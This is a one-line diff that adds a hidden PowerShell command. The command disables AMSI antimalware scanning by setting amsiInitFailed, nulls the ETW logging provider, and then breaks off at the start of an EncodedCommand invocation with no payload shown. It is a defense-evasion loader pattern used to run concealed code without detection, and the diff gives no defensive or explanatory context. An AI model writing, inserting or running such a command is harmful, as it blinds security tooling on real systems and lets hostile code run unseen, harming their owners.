@@ -1,0 +1,1 @@
+powershell -nop -w hidden -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::amsiInitFailed = $true; [System.Management.Automation.Tracing.PSEtwLogProvider]::etwProvider = [IntPtr]::Zero; powershell -EncodedCommand 
